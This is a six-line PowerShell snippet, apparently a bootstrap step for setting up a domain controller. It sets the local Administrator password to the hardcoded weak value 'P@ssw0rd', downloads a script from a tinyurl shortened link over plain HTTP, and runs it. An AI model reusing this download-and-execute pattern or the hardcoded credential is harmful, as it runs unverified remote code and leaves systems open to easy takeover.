$admin = [adsi]('WinNT://./administrator, user');
$admin.psbase.invoke('SetPassword','P@ssw0rd');
$wc = new-object system.net.webclient; 
$wc.DownloadFile('http://tinyurl.com/cabzrts','c:\DCBootStrap.ps1');
cd \;
.\DCBootStrap.ps1;